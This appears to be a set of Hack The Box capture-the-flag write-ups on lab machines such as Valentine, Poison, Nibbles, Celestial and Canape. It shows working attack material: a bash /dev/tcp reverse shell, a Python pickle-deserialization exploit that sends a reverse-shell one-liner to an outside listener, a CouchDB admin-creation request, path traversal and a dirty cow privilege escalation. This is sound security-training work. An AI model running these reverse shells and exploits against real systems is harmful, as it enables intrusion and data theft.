# Hack The box

## Solving the First challenge (Registration)

In order to join to the platform, you should solve the first challenge.

Once in the **JOIN** section, open we are asked to prompt a code. We don't have any code yet, so the first step is to look into the page source to find something. After a digging some time, you will find a link to a JS script: **/js/inviteapi.min.js**. After openning and formating it:

```javascript

eval(
    function  (p,a,c,k,e,d){
        e = function(c){return c.toString(36)};
        if ( !''.replace(/^/,String)){
            while(c--){
                d[c.toString(a)] = k[c] || c.toString(a)
            }
            k = [function(e){return d[e]}];
            e = function(){return'\\w+'};
            c = 1
        };
        while(c--){
            if (k[c]){
                p = p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])
            }
        }
        return p    
    }
    ('1 i(4){h 8={"4":4};$.9({a:"7",5:"6",g:8,b:\'/d/e/n\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}1 j(){$.9({a:"7",5:"6",b:\'/d/e/k/l/m\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}',
    24,
    24,
    'response|function|log|console|code|dataType|json|POST|formData|ajax|type|url|success|api|invite|error|data|var|verifyInviteCode|makeInviteCode|how|to|generate|verify'.split('|'),
    0,
    {}
    )
)

```

So basically, it's a JS functiont that it's being called with some specific parameters.

It's not necessary to fully understand the whole thing, we can just use the Chrome/Firefox JS console and make use of this code. Nevertheless, if you copy & paste it, it won't work due to a name for the function is missing. What I did was just to choose some name, copy only the part of the function definition an afterwards call it with the specific parameters:

![script result](./images/script_result.png)

The answer gathered is again JS code:

```javascript

function verifyInviteCode(code){
    var formData = {"code":code};
    $.ajax({
        type:"POST",
        dataType:"json",
        data:formData,url:'/api/invite/verify',
        success:function(response){
            console.log(response)
        },
        error:function(response){
            console.log(response)
        }
    })
}

function makeInviteCode(){
    $.ajax({
        type:"POST",
        dataType:"json",
        url:'/api/invite/how/to/generate',
        success:function(response){
            console.log(response)
        },
        error:function(response){
            console.log(response)
        }
    })
}

```

This time seems to show us how the **InviteCode** related functions are invoked... Time to use **burp**:

Issuing the following POST we will receive an answer with some information encoded: 

```

POST /api/invite/how/to/generate HTTP/1.1
Host: www.hackthebox.eu
Connection: close
Accept: */*

```

```

{"success":1,"data":{"data":"SW4gb3JkZXIgdG8gZ2VuZXJhdGUgdGhlIGludml0ZSBjb2RlLCBtYWtlIGEgUE9TVCByZXF1ZXN0IHRvIC9hcGkvaW52aXRlL2dlbmVyYXRl","enctype":"BASE64"},"0":200}

```

After decoding the value inside **data** which is encoded with the encoding mentioned in **enctype**, you'll get the a message saying:
**In order to generate the invite code, make a POST request to /api/invite/generate**

So, let folow their order:

```

POST /api/invite/generate HTTP/1.1
Host: www.hackthebox.eu
Connection: close
Accept: */*

```

```

{"success":1,"data":{"code":"WElLQVktWFlFWk8tTkpaTEotVVNFQVMtWkJBTE4=","format":"encoded"},"0":200}

```

And here it is.. Our **code** is encoded in base64. Once decoded you'll get your code:

**XIKAY-XYEZO-NJZLJ-USEAS-ZBALN** (in my case).

### Disclaimer

I did the challenge again for the write up because I forgot to do it the first time.
This time, the code worked perfectly once I typed it. But the first time I did the challenge I remember that I wasn't able to use the code retrieved, and some error saying something about "This IP can't use the code" was triggered. I solved it just connecting through a VPN.

## Bashed (User)

### User

This machine was pretty easy.
First of all I used **dirb** to start listing some common directories.

```bash

dirb http://10.10.10.68 common.txt

```

Some directories were found:

![dirb directories](./images/bashed/dirb.png)

The **dev** seemed to be the most interesting one, therefore I started from there:

![dev index](./images/bashed/dev_index.png)

And once inside **phpbash.php**:

![dev index](./images/bashed/user_hash.png)

### Root

**TBD**

## Valentine (User & root)

### User

So, in order to start, as always, I used **nmap**:

![nmap](./images/valentine/nmap.png)

**SSH**, **HTTP**, **HTTPS**. Let's navigate the web servers while we wait for **dirb** again.

The index of both webservers is an image of a woman like shouting and the logo of **heartbleed**:

![index page](./images/valentine/webserver_index_image.png)

From last machine I learn that inside **/dev/** something could appear. Let's try...:

![index_dev](./images/valentine/index_dev.png)

Well, that was lucky. Inside the **notes.txt** there isn't anything interesting, but inside **hype_key**, there is some **encoded** text. Seems to be printable hex, so let's try to decode it: [hex to ascii](https://www.rapidtables.com/convert/number/hex-to-ascii.html)

```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,AEB88C140F69BF2074788DE24AE48D46

DbPrO78kegNuk1DAqlAN5jbjXv0PPsog3jdbMFS8iE9p3UOL0lF0xf7PzmrkDa8R
5y/b46+9nEpCMfTPhNuJRcW2U2gJcOFH+9RJDBC5UJMUS1/gjB/7/My00Mwx+aI6
0EI0SbOYUAV1W4EV7m96QsZjrwJvnjVafm6VsKaTPBHpugcASvMqz76W6abRZeXi
Ebw66hjFmAu4AzqcM/kigNRFPYuNiXrXs1w/deLCqCJ+Ea1T8zlas6fcmhM8A+8P
OXBKNe6l17hKaT6wFnp5eXOaUIHvHnvO6ScHVWRrZ70fcpcpimL1w13Tgdd2AiGd
pHLJpYUII5PuO6x+LS8n1r/GWMqSOEimNRD1j/59/4u3ROrTCKeo9DsTRqs2k1SH
QdWwFwaXbYyT1uxAMSl5Hq9OD5HJ8G0R6JI5RvCNUQjwx0FITjjMjnLIpxjvfq+E
p0gD0UcylKm6rCZqacwnSddHW8W3LxJmCxdxW5lt5dPjAkBYRUnl91ESCiD4Z+uC
Ol6jLFD2kaOLfuyee0fYCb7GTqOe7EmMB3fGIwSdW8OC8NWTkwpjc0ELblUa6ulO
t9grSosRTCsZd14OPts4bLspKxMMOsgnKloXvnlPOSwSpWy9Wp6y8XX8+F40rxl5
XqhDUBhyk1C3YPOiDuPOnMXaIpe1dgb0NdD1M9ZQSNULw1DHCGPP4JSSxX7BWdDK
aAnWJvFglA4oFBBVA8uAPMfV2XFQnjwUT5bPLC65tFstoRtTZ1uSruai27kxTnLQ
+wQ87lMadds1GQNeGsKSf8R/rsRKeeKcilDePCjeaLqtqxnhNoFtg0Mxt6r2gb1E
AloQ6jg5Tbj5J7quYXZPylBljNp9GVpinPc3KpHttvgbptfiWEEsZYn5yZPhUr9Q
r08pkOxArXE2dj7eX+bq65635OJ6TqHbAlTQ1Rs9PulrS7K4SLX7nY89/RZ5oSQe
2VWRyTZ1FfngJSsv9+Mfvz341lbzOIWmk7WfEcWcHc16n9V0IbSNALnjThvEcPky
e1BsfSbsf9FguUZkgHAnnfRKkGVG1OVyuwc/LVjmbhZzKwLhaZRNd8HEM86fNojP
09nVjTaYtWUXk0Si1W02wbu1NzL+1Tg9IpNyISFCFYjSqiyG+WU7IwK3YU5kp3CC
dYScz63Q2pQafxfSbuv4CMnNpdirVKEo5nRRfK/iaL3X1R3DxV8eSYFKFL6pqpuX
cY5YZJGAp+JxsnIQ9CFyxIt92frXznsjhlYa8svbVNNfk/9fyX6op24rL2DyESpY
pnsukBCFBkZHWNNyeN7b5GhTVCodHhzHVFehTuBrp+VuPqaqDvMCVe1DZCb4MjAj
Mslf+9xK+TXEL3icmIOBRdPyw6e/JlQlVRlmShFpI8eb/8VsTyJSe+b853zuV2qL
suLaBMxYKm3+zEDIDveKPNaaWZgEcqxylCC/wUyUXlMJ50Nw6JNVMM8LeCii3OEW
l0ln9L1b/NXpHjGa8WHHTjoIilB5qNUyywSeTBF2awRlXH9BrkZG4Fc4gdmW/IzT
RUgZkbMQZNIIfzj1QuilRVBm/F76Y/YMrmnM9k/1xSGIskwCUQ+95CGHJE8MkhD3
-----END RSA PRIVATE KEY-----

```
Nice! We have a private key... but what for? Maybe to login by **ssh**? We still need the passphrase for it... 
I was expecting that **dirb** helped me with the output, but .. unfortunately, it didn't helped me. There were some **php** scrips that seemed to encode/decode base64, but nothing else (well, it has the **/dev** directory):

![dirb output](./images/valentine/dirb.png)

Then, I remembered that there was also an HTTPS server and due to the fact that this image is showing us the logo of hearbleed... maybe we can use the heartbleed exploit to gather information from there?
To perform this part I used **Metasploit** because it already had a [module](https://www.rapid7.com/db/modules/auxiliary/scanner/ssl/openssl_heartbleed) to do it. The usage was pretty straighforward, and after a couple of seconds I had some memory samples:

![msf scan](./images/valentine/msf_scan_heartbleed.png)

![msf dump](./images/valentine/msf_dump_heartbleed.png)

After analzing these samples, I found a very interesting thing. There was an HTTP request there:

![msf dump output](./images/valentine/msf_dump_output.png)

It was using one the **.php** scripts that we found thanks to **dirb**, which was **decode.php**.. Let's try to decode it:

![passphrase](./images/valentine/passphrase.png)

**YEAH!** seems we have something usefull here. We have an RSA Private key and now we have something that seems to be a passphrase, but..how can we ensure that this is the correct passphrase?

In order to ensure it, I issued the following command

```bash
ssh-keygen -y -f rsa_key.pem
```

with **rsa_key.pem** being the private RSA key.  This command will extract the publick key from the PEM, only if we have the correct passphrase. You, after executing it, and typing the passphrase **heartbleedbelievethehype** the public key was successfully created.

So far we have the PEM and the passphrase for it. My main idea is that this should be used to connect to the server via **SSH**. But still, we don't know the user. I spent a **LOOOONGG** time thinking that I wasn't issuing a right command to connect using the PEM, but the problem was not the command but the user. I thought that **valentine** had to be the correct one. After a couple of hours (yes, hours) I realize that maybe the user wasn't that one...

I spent lot of time trying to find the correct user:

* Looking on new samples of memory gathered by exploiting heartbleed.
* Looking in the page source code of the pages hosted in the HTTP Server.
* Trying with common users (guest, www-data, etc).
* Among others.

Finally, two of my neurons did synapsis and I realized that the file where I found the encoded RSA private key, was called **hype_key**. So I literally ran to type the following command, which **fortunately** gave me access to the machine.

```
ssh -v -i rsa_key.pem hype@10.10.10.79
```

Once inside, it was just needed to go to the home directory of this user, and find the **user.txt** file with the hash inside.

### Root

I copied the **LinEnum.sh** file to the vm, and made a scan but the path finally wasn't that one.
I wanted to know the Kerknel version so figure it out if there was some exploit for it. then I issued the command:

```bash
uname -a 
Linux Valentine 3.2.0-23-generic #36-Ubuntu SMP Tue Apr 10 20:39:51 UTC 2012 x86_64 x86_64 x86_64 GNU/Linux
```

So yeah, the Kernel seemed to be pretty old. I tried with 4 different exploits, two related with the vulnerability on **perf_swevent_init** and other two related to **dity cow**. Unfortunately, there didn't work (don't know why, specially the latest).

Finally, I found some [video](https://www.youtube.com/watch?v=0BHFT8YkApI) explaining how to use a variant of **dirty cow** to modify the **/etc/passwd/** file in order to create a new user with id 0 (root privileges). [Exploit](https://raw.githubusercontent.com/FireFart/dirtycow/master/dirty.c)

The exploit was very straighforwad to use, the only thing I had to change was the value of the salt, for my current user. Afterwards, I was able to run the script. Once it was running, I connected to the system with another shell using the new username and the password that was asked me to set. 

![dirty cow](./images/valentine/dirty_cow_on_action.png)

![root flag](./images/valentine/root_flag.png)

## Poison (User & root)

### User

So, started with the usual nmap command: 
![nmap](./images/poison/nmap.png)

We have a lot of things to attack. Let's start with the http. 


First page ask you to choose one script.. Let's took **listfiles.php**...

![scripts](./images/poison/scripts.png)

![listfiles.php](./images/poison/listfiles.png)

The answer back is an Array object with each file that is inside that folder.. If we pay attention there is one called **pwdbackup.txt**. I'd like to read it.. so.. what happens if we change the file param of the url? 

![pswdbackup](./images/poison/passwd_backup.png)

Great... Now.. encoded at least 13 times, pretty easy to noticed that the encode is base64, so let's decoded. I developed a very simple script:

```python
import base64 

password = "Vm0wd2QyUXlVWGxWV0d4WFlURndVRlpzWkZOalJsWjBUVlpPV0ZKc2JETlhhMk0xVmpKS1IySkVUbGhoTVVwVVZtcEdZV015U2tWVQpiR2hvVFZWd1ZWWnRjRWRUTWxKSVZtdGtXQXBpUm5CUFdWZDBSbVZHV25SalJYUlVUVlUxU1ZadGRGZFZaM0JwVmxad1dWWnRNVFJqCk1EQjRXa1prWVZKR1NsVlVWM040VGtaa2NtRkdaR2hWV0VKVVdXeGFTMVZHWkZoTlZGSlRDazFFUWpSV01qVlRZVEZLYzJOSVRsWmkKV0doNlZHeGFZVk5IVWtsVWJXaFdWMFZLVlZkWGVHRlRNbEY0VjI1U2ExSXdXbUZEYkZwelYyeG9XR0V4Y0hKWFZscExVakZPZEZKcwpaR2dLWVRCWk1GWkhkR0ZaVms1R1RsWmtZVkl5YUZkV01GWkxWbFprV0dWSFJsUk5WbkJZVmpKMGExWnRSWHBWYmtKRVlYcEdlVmxyClVsTldNREZ4Vm10NFYwMXVUak5hVm1SSFVqRldjd3BqUjJ0TFZXMDFRMkl4WkhOYVJGSlhUV3hLUjFSc1dtdFpWa2w1WVVaT1YwMUcKV2t4V2JGcHJWMGRXU0dSSGJFNWlSWEEyVmpKMFlXRXhXblJTV0hCV1ltczFSVmxzVm5kWFJsbDVDbVJIT1ZkTlJFWjRWbTEwTkZkRwpXbk5qUlhoV1lXdGFVRmw2UmxkamQzQlhZa2RPVEZkWGRHOVJiVlp6VjI1U2FsSlhVbGRVVmxwelRrWlplVTVWT1ZwV2EydzFXVlZhCmExWXdNVWNLVjJ0NFYySkdjR2hhUlZWNFZsWkdkR1JGTldoTmJtTjNWbXBLTUdJeFVYaGlSbVJWWVRKb1YxbHJWVEZTVm14elZteHcKVG1KR2NEQkRiVlpJVDFaa2FWWllRa3BYVmxadlpERlpkd3BOV0VaVFlrZG9hRlZzWkZOWFJsWnhVbXM1YW1RelFtaFZiVEZQVkVaawpXR1ZHV210TmJFWTBWakowVjFVeVNraFZiRnBWVmpOU00xcFhlRmRYUjFaSFdrWldhVkpZUW1GV2EyUXdDazVHU2tkalJGbExWRlZTCmMxSkdjRFpOUkd4RVdub3dPVU5uUFQwSwo="

for _ in xrange(13):
	password = base64.decodestring(password)

print password
```

Once executed.. the answer is: **Charix!2#4%6&8(0**.
Ok maybe this could be a password for something.. maybe ssh, maybe vnc? Anyways, we are missing the user. How could we get the user?. 
What if we use again the path traversal vuln?:

![etc passwd](./images/poison/etc_passwd.png)

Perfect. There is a user called **charix**, due to the password has also that string, I guess is the correct user for our password.
Let's try an ssh connection: 


![user flag](./images/poison/user_flag.png)


### Root 

Ok, once I started using **LinEnum.sh**, looking for filesystem files, doing enumeration basically. The first thing, is the **secret.zip** file which is placed in the home of charix. 

I copied to my local machine and tried to bruteforce it with JTR, but no luck at all. Then I tried to use the same password as the user of charix and worked!. Anyways, the file is very strange, is just ascii text maybe encoded or encrypted or corrupted. At this moment I thought it was just a troll. 

Then, I continued enumerating and discovered some processes running as root listeining only in localhost: 

![process localhost](./images/poison/processes_localhost.png)

In particular, **Xvnc** and **sendmail** sound weird for me to be running as root. Due to I didn't have any idea of what sendmail was, I started looking for vnc. 

So I looked for some commands in the machine (just pressing vnc<TAB>) and found **vncpasswd**. Once I ran it, a message telling me which password file was using appeared. So I went to look for that file, and get the following:

![vncpasswd and file](./images/poison/decrypting_passwd_file.png)

So, after "catting" I realise that was more or less the same format as the file that I already decompressed from the ZIP. 
So then I went to the internet to try to see if this format was already broken or if there was some tool to let you read the password in plain text from this file. And... yes! there was [one](https://github.com/jeroennijhof/vncpwd).

After using it, get the password **VNCP@$$!**.

This probably is the password of root (or toor, there are two users with id 0). I tried them first with ssh, but it didn't work. Clearly, was the VNC password, but I had to test it anyways.

At this moment I totally forgot that my nmap had discovered a VNC open port, so I spend more than an hour trying to figure it out how how to initiate a connection from the machine itself to this server that was only listening in the localhost. Finally, I did something different. I used ssh, to make a port forwarding from my local machine to a port of the local port 5901 of the remote machine, by ussing the following command:

```bash
ssh -L 5901:127.0.0.1:5901 -N -f -l Charix 10.10.10.84
```

Once I made that connection, using remmina, the root user and the password found, I was able to get the flag: 
![remmina](./images/poison/remmina_config.png)

![root flag](./images/poison/root_flag.png)

YEAH! I had to copy it char by char xD.

## Nibbles (User & Rooted)

### User

Reading comments. Found

```html
<!-- /nibbleblog/ directory. Nothing interesting here! -->
```

Ran dirbuster against http://10.10.10.75/nibbleblog/ 
Found **admin.php**.

Tried with some default credentials:

* admin:admin
* nibbles:nibbles
* admin:nibbles **(GOT IT!)**

Tried to look for a LFI in some upload of images (new page, new post) without luck..

Search in google for nibbleblog: **It is a well-known CMS!**.. Looking for exploit: YEAH! INside **MSF**.

Run the exploit:

![msf_exploit](./images/nibbles/msf_exploit.png)

Once with the meterpreter.

```bash
cat /etc/passsd
```
Showed me, that there was only one user interesting called **nibbler**.

```bash
whoami
```
returned also **nibbler**.

Went to /home/nibbler and...:
![user_flag](./images/nibbles/user_flag.png)

### Root

So, first step was to create a reverse shell.. In order to do that I did:

** On my local machine **

```bash
sudo ufw allow 3333
nc -lnvp 3333
```

** On the remote machine**

```bash
bash -i
bash -i >& /dev/tcp/IP/3333 0>&1
```

![reverse_shell](./images/nibbles/reverse_shell.png)

Once I have the reverse shell in my local pc, I "upgraded" to a full tty (I learned this trick by looking this [video](https://www.youtube.com/watch?v=uc3pMrIbP88)).

So next step was use the **LinEnum.sh**. I found it already in the vm, but othrwise uploading in it to the vm wouldn't be a problem at all (wget to some http server or some other way).

Once I ran it, one of the outputs was:

```bash
User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh

[+] Possible sudo pwnage!
-rwxrwxrwx 1 nibbler nibbler 21 May  1 19:01 /home/nibbler/personal/stuff/monitor.sh
```

This basicall means that there is a misconfiguration in the **/etc/sudoers** file which allows the user **nibbler** to execute any **monitor.sh** as root, without prompting any password. So my next step was simply:

```bash
echo "cat /root/root.txt" > /home/nibbler/personal/stuff/monitor.sh
sudo /home/nibbler/personal/stuff/monitor.sh
```
**It's extremely important to run the the sudo comand not with the relative path, but with the absolute one. Because that's how sudo works**

The output was the flag =):

![root_flag](./images/nibbles/root_flag.png)

## Celestial (User & Rooted)

### User

After the nmap output we see that there is an open port running express js: 
![nmap](./images/nmap.png)

Next step was to run **dirb** against it, while I went to see this page using a web browser.

Once we enter with the browser, a **CUSTOM** page saying 404 appears.. But if you go to analyze the HTTP response, you'll see that it isn't a real 404.. In fact, doing a deeper analysis, we will see that the **set-cookie** is present, and the payload seems to be base64. 

![set cookie](./images/celestial/set_cookie.png)

If we refresh the page we will see this output:

![hey dummy](./images/celestial/hey_dummy.png)

And if we decode the cookie, we'll have:

```json
{"username":"Dummy","country":"Idk Probably Somewhere Dumb","city":"Lametown","num":"2"}
```

So my first attempt was trying to change the username for admin, or something like that but nothing happened. Then I realize that the message in the index page was saying **Dummy** and **2**.  So I changed the **num** for an "a" and the following I received the following response:

![eval](./images/celestial/eval.png)

This was great. If you pay attention to the response, you'll see that the error cames from an **eval** function. So basically this means that they we can execute arbitrary JS code?.. Let's see..:

![payload_test](./images/celestial/payload_test.png)

After a couple of tests I realize that the server was doing something like:

```javascript
...
eval("num + num");
...
```

That's why I appended "//" to the final of the payload in order to comment the rest of the line.

So, basically this means that we are able to execute arbitrary JS code. Next step, was look in the internet for a reverse shell. I found it (its in my documentation), adapt it and used it.

![reverse shell](./images/celestial/reverse_shell.png)

Once I got the reverse shell and upgraded to TTY, I finally get the user.txt from the **Documents** directory.

### Root

This part was very straightforward... 
Once I get the user shell, I start seeing the files that were in the **/home/user** directory and there was a strange file called **output.txt** which was own by root, but readeable for everyone. This file just contained the message " Script is running ".

Afterwards, I found a python script in the **Documents** directory of the user, that just had the following line 

```python
print "Script is running..."
```

The **output.txt** was being written each 5 minutes. So quickly I understood that this script was being executed by the **root** user and the output was written to this **txt** file. 

So, why I did was to edit the script and add the following lines:

```python
content = open("/root/root.txt","r").read()
print content
```

After 5 minutes (or less) the output was written again, and the content was the flag: 

![root](./images/celestial/root.png)    

## Canape (User & root)

### User

This was my favorite machine so far. Thanks: @overcast!.
So, as always, lets start with nmap:

```bash
$> nmap -sC -sV 10.10.10.70  > nmap
```

And here is the output:

![nmap canape](./images/canape/nmap.png)

Great, while we go to the HTTP server, I'll let an nmap full scan running..
Once we connect to the HTTP server we find some stuff related with The Simpsons, nothing interesting yet..
Looking to the source code of the main page, we find this: 

![commit source code](./images/canape/hash_commit_source_code.png)

Ok..  Seems not to be too relevant right now, but .. maybe it's useful later on. I continued digging in across the web site, trying to submit some quote with malicious content, but without luck.  Then, I realized that the nmap has discovered a **.git** directory, so I proceed to download it: 

```bash
$> wget --recursive --no-parent http://10.10.10.70/.git/
``` 

Once I get into the directory, I listed all the logs and figured it out that one of the hashes of the commits, was the same as the one in the source code of the web page. At that moment, I thought that this hash was telling us the current version of the running application. I listed all the files of the initial commit, and then add the updates that the commit made, and extract a code of a Flask application.

![logs](./images/canape/git_logs.png)

Just in a few words, this application had to main entrypoints:

* **submit**: Where you can submit your quote, and it will stored using **Pickle**.
* **check**: Where it will load the content of your quote **as a Pickle** and show it back to you.

I searched for some tutorials of how to exploit this and fortunately I found a couple of them. 

So, time to develop our own exploit. My next step, was to copy the code locally, remove the things that where not important for us (connection to DB, rendering of templates, etc) and start testing it. After some time, I had my exploit working locally, so I went to test it remotely. Unfortunately, I didn't work at all, and I didn't have any clue why it wasn't working.

I started to go back on my steps, and figured it out something crucial. The **submit** endpoint was saving the content of the submitted quote in a temporary file. The name of this file was the result of getting the 10 first chars of the encoding in base64 of concatneation between the character & quote content: 

```python
...
p_id = base64.b64encode(char + quote)[:10]
...
```

Or.. at least, that was why I thought... When I went back on my steps, I figured the commits after the one we analyzed, some changes on the code were made.. In particular there was one, that changed the way of defining the file name.. They changed from the base64 encoding of the first 10 chars to the md5 hash 
of the concatenation:

```
git show 524f9ddcc74e10aba7256f91263c935c6dfb41e1
    -    p_id = base64.b64encode(char + quote)[:10]
    +    p_id = md5(char + quote).hexdigest()
```

So I decided to get the last version of the application (by analyzing the changes of each commit) and develop again the exploit. 

This was final version of the python application:

```python
import string
import random
import base64
import cPickle
from flask import Flask, render_template, request
from hashlib import md5

app = Flask(__name__)

@app.errorhandler(404)
def page_not_found(e):
    if random.randrange(0, 2) > 0:
        return ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(random.randrange(50, 250)))
    else:
	return render_template("index.html")

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/quotes")
def quotes():
    quotes = []
    for id in db:
        quotes.append({"title": db[id]["character"], "text": db[id]["quote"]})
    return render_template('quotes.html', entries=quotes)

WHITELIST = [
    "homer",
    "marge",
    "bart",
    "lisa",
    "maggie",
    "moe",
    "carl",
    "krusty"
]

@app.route("/submit", methods=["GET", "POST"])
def submit():
    error = None
    success = None

    if request.method == "POST":
        try:
            char = request.form["character"]
            quote = request.form["quote"]
            print "Char: {}]\nQuote:{}".format(char,quote)
            if not char or not quote:
                error = True
            elif not any(c.lower() in char.lower() for c in WHITELIST):
                error = True
            else:
                # TODO - Pickle into dictionary instead, `check` is ready
                #p_id = base64.b64encode(char + quote)[:10]
                p_id = md5(char + quote).hexdigest()
                outfile = open("/tmp/" + p_id + ".p", "wb")
		outfile.write(char + quote)
		outfile.close()
	        success = True
        except Exception as ex:
            error = True

    if error:
        return "<html><p1>error</p1></html>"
    else:
        return "<html><p1>success</p1></html>"
    #return "render_template("submit.html", error=error, success=success)

@app.route("/check", methods=["POST"])
def check():
    print request.form["id"]
    path = "/tmp/" + request.form["id"] + ".p"
    data = open(path, "rb").read()

    if "p1" in data:
        item = cPickle.loads(data)
    else:
        item = data
    print item
    return "Still reviewing: " + item

if __name__ == "__main__":
    app.run(host="0.0.0.0")
```
(it may be a little modified, but the core parts are there.)
So with this version running locally, I continued developing my exploit to get a reverse shell, and after a couple of minutes, I achieved this: 

```python
import requests
#import base64
from hashlib import md5

PATH_REMOTE = "http://10.10.10.70/{}"
PATH_LOCAL = "http://192.168.0.15:5000/{}"
REMOTE = True

def submit_exploit(cmd):
    action = 'submit'
    char = "S'homer'\np1\ncos\nsystem\n(S'{cmd}'\ntRS'marge'\np1\n".format(cmd=cmd)
    quote = '.'
    payload = "character={char}&quote={quote}".format(char=char,quote=quote)
    headers = {'Content-type': 'application/x-www-form-urlencoded'}
    path = PATH_REMOTE.format(action) if REMOTE else PATH_LOCAL.format(action)
    print payload
    r = requests.post(path, data=payload, headers=headers)
    if r.status_code == 200 and ("thank you for your suggestion" in r.text.lower() or 'success' in r.text.lower()): 
        print "[+] Payload successfully sent. Command: {cmd}".format(cmd=cmd)
        #return base64.encodestring(char+quote)[:10]
        return md5(char+quote).hexdigest()
    else:
        print "[-] Error sending payload"
        raise Exception("Error sending payload: \n\tHttp code returned: {http_code}. \n\t response body:\n {body}".format(http_code= r.status_code, body=r.text))

def check_and_run_exploit(id_code):
    action = 'check'
    headers = {'Content-type': 'application/x-www-form-urlencoded'}
    payload = "id={id_code}".format(id_code=id_code)
    path = PATH_REMOTE.format(action) if REMOTE else PATH_LOCAL.format(action)
    r = requests.post(path, data=payload, headers=headers)
    if r.status_code == 200: 
        print "[+] Exploit successfully executed"
        return r.text
    else:
        print "[-] Error executing exploit"
        raise Exception("Error executing exploit: \n\tHttp code returned: {http_code}. \n\t response body:\n {body}".format(http_code= r.status_code, body=r.text))

if __name__ == "__main__":
    cmd = "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.255\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
    id_code = submit_exploit(cmd)
    check_and_run_exploit(id_code)
```

Two disclaimers:

* The first and last part of the payload have two strings Homer and Marge. The first one is to bypass the whitelist filtering that app has regarding the name of the character. The last one is to avoid the application to trigger and error when concatenating the result of the Pickle.load() to a string (otherwise it will try to concatenate a number (the error code of the executed command) and a string, and it will fail).
* The REMOTE variable is just something custom made to quickly switch between the Remote server and my local one.

After launching the exploit, we get a reverse shell in the port 4444. Once we got the reverse shell, we upgraded to tty (see ippsec video) in order to have more features (history, auto-completition, etc).

![reverse shell](./images/canape/reverse_shell.png)

Although, we have a reverse shell, the user running the HTTP server is **www-data**, so we need to escalate privileges and log in as other user. 
Once inside the machine, my first move was to run **LinEnum.sh**. Once of the outputs of it was the following: 

![troll](./images/canape/troll.png)

I spent hours, trying to understand this file. Until I gave up (hopefully I did it) and continue looking in another place. I guess it was a **BIG** troll.

Analyzing the applications running on the system and its ports, I found the **couchdb** running in localhost. 
I started reading a little bit about this DB (never saw it before), and quickly figure it out how to connect to it: 

```bash
$> curl -X GET http://localhost:5984
{"couchdb":"Welcome","version":"2.0.0","vendor":{"name":"The Apache Software Foundation"}}
```

I started playing around a little more and figured it out how to list dbs and docs inside them: 

```bash
$> curl -X GET http://localhost:5984/_all_dbs
["_global_changes","_metadata","_replicator","_users","passwords","simpsons"]
$> curl -X GET http://localhost:5984/simpsons/_all_docs
{"total_rows":7,"offset":0,"rows":[
{"id":"f0042ac3dc4951b51f056467a1000dd9","key":"f0042ac3dc4951b51f056467a1000dd9","value":{"rev":"1-fbdd816a5b0db0f30cf1fc38e1a37329"}},
{"id":"f53679a526a868d44172c83a61000d86","key":"f53679a526a868d44172c83a61000d86","value":{"rev":"1-7b8ec9e1c3e29b2a826e3d14ea122f6e"}},
{"id":"f53679a526a868d44172c83a6100183d","key":"f53679a526a868d44172c83a6100183d","value":{"rev":"1-e522ebc6aca87013a89dd4b37b762bd3"}},
{"id":"f53679a526a868d44172c83a61002980","key":"f53679a526a868d44172c83a61002980","value":{"rev":"1-3bec18e3b8b2c41797ea9d61a01c7cdc"}},
{"id":"f53679a526a868d44172c83a61003068","key":"f53679a526a868d44172c83a61003068","value":{"rev":"1-3d2f7da6bd52442e4598f25cc2e84540"}},
{"id":"f53679a526a868d44172c83a61003a2a","key":"f53679a526a868d44172c83a61003a2a","value":{"rev":"1-4446bfc0826ed3d81c9115e450844fb4"}},
{"id":"f53679a526a868d44172c83a6100451b","key":"f53679a526a868d44172c83a6100451b","value":{"rev":"1-3f6141f3aba11da1d65ff0c13fe6fd39"}}
$> curl -X GET http://localhost:5984/passwords/_all_docs
{"error":"unauthorized","reason":"You are not a server admin."}
```

So the job now seems to be getting server admin. After a google search looking for vulnerabilties affecting this DB in this version, I found this **EXCELENT** [blogpost](https://justi.cz/security/2017/11/14/couchdb-rce-npm.html). Basically the attack consist in creating a server admin without any credentials only by sending an HTTP request (for further details, read the blog).

I changed (just the names) a little bit the PoC of the blog and executed against the db: 

```bash
$> curl -X PUT 'http://localhost:5984/_users/org.couchdb.user:oops' --data-binary '{
  "type": "user",
  "name": "tsuller",
  "roles": ["_admin"],
  "roles": [],
  "password": "tsuller"
}'
{"ok":true,"id":"org.couchdb.user:tsuller","rev":"1-0b547bb36cb610ec21d9571312f6e20c"}
```

Yes! Seems that it worked! Lets check:

```bash
$> curl -X GET http://tsuller:tsuller@localhost:5984/_passwords/_all_docs
{"total_rows":4,"offset":0,"rows":[
{"id":"739c5ebdf3f7a001bebb8fc4380019e4","key":"739c5ebdf3f7a001bebb8fc4380019e4","value":{"rev":"2-81cf17b971d9229c54be92eeee723296"}},
{"id":"739c5ebdf3f7a001bebb8fc43800368d","key":"739c5ebdf3f7a001bebb8fc43800368d","value":{"rev":"2-43f8db6aa3b51643c9a0e21cacd92c6e"}},
{"id":"739c5ebdf3f7a001bebb8fc438003e5f","key":"739c5ebdf3f7a001bebb8fc438003e5f","value":{"rev":"1-77cd0af093b96943ecb42c2e5358fe61"}},
{"id":"739c5ebdf3f7a001bebb8fc438004738","key":"739c5ebdf3f7a001bebb8fc438004738","value":{"rev":"1-49a20010e64044ee7571b8c1b902cf8c"}}
]}
```

YES! Worked. Lets dump the content of each doc:

```bash
$> curl http://tsuller:tsuller@localhost:5984/passwords/739c5ebdf3f7a001bebb8fc4380019e4
{"_id":"739c5ebdf3f7a001bebb8fc4380019e4","_rev":"2-81cf17b971d9229c54be92eeee723296","item":"ssh","password":"0B4jyA0xtytZi7esBNGp","user":""}
$> curl http://tsuller:tsuller@localhost:5984/passwords/739c5ebdf3f7a001bebb8fc43800368d
{"_id":"739c5ebdf3f7a001bebb8fc43800368d","_rev":"2-43f8db6aa3b51643c9a0e21cacd92c6e","item":"couchdb","password":"r3lax0Nth3C0UCH","user":"couchy"}
